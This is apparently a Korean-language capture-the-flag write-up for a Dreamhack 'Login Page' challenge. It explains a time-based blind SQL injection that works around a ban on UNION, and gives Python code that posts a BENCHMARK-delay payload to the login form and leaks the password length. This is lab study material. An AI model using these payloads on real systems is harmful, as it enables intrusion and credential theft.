---
title: Login Page
date: 2026-07-15
draft: false
ShowToc: true
tags:
  - Writeup
  - Dreamhack
  - SQLi
---

## 공격표면
- flag(`./deploy/app/app.py:160`):    `return render_template('login.html', msg=FLAG)`

## 풀이
1. `username == actual_username and password == actual_password`
2. `SQL_BAN_LIST`에 쿼리문 내용 포함되어 있지 않아야 함
- 입력 pw가 실제 pw(random)와 동일해야 함 -> 불가능 
	- 그렇다면 내가 집어넣은 값을 가져와야 동일하게 맞출 수 있음
	- Union select를 사용하면 이를 해결할 수 있지만, 2에서 union이 ban되어 있음
	- Union을 사용하지 않고, 혹은 우회해서 내가 원하는 값을 넣을 수 있는가?
	- `=, benchmark, substr/mid` 사용 가능 -> blind sqli
```python 
def measure(cond_sql):
	payload = f"a' OR IF({cond_sql}, BENCHMARK({DELAY},SHA1(1)), 0)-- "
	s = fresh_session()
	t = time.time()
	s.post(f'{BASE}/login', data={'username': 'admin', 'password': payload})
	return time.time() - t
	
def leak_length():
	for n in range(1, 128):
		if ask(f'LENGTH(password)={n}'):
			return n
	return None
```


## 배운 점
- BlindSQL 판단 지점